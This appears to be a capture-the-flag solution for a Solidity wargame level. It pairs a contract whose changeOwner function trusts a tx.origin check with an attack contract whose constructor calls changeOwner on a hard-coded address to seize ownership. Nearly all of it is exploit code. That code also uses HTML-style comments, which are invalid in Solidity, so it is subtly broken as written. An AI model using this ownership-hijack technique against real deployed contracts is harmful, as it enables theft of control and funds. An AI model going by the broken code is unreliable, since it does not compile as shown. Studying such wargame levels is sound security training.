pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

solution: The TX sender has to be different from the msg.sender so that the new owner can be determined.

pragma solidity ^0.4.24;

contract telephone {
    function changeOwner(address _owner) public;
}

contract inception{
    constructor() {
        <!-- this will call the function with a different contract address -->
        telephone contractToCall = telephone(0x4f05ccb4066b24bf5cfe0963fb335b5a13cb0d66);
        <!-- this will determine me as the new contract owner -->
        contractToCall.changeOwner(0x8c2a483d40181bac86efc7b9e1f5dc4b4b7e3df6);
    }
}
